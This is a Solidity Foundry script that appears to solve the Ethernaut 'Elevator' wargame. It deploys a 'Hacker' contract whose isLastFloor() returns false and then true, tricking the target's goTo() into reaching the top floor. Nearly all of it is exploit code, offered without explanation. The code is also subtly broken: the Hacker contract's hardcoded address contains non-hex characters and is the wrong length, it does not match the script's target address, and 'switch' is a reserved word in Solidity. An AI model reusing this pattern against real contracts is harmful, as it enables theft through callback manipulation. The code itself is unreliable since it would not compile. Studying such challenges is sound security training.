pragma solidity ^0.6.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Hacker {

    bool private switch;
    Elevator public elevatorInstance = Elevator(0x50C677101906d0ar4Ij923B93dBDAfC64D3);

    function hack() external {
        elevatorInstance.goTo(0);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if(!switch){
            switch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorSolution is Script {

    Elevator public elevatorInstance = Elevator(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3689C);


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hacker hacker = new Hacker();
        hacker.hack();
        vm.stopBroadcast();
    }
}
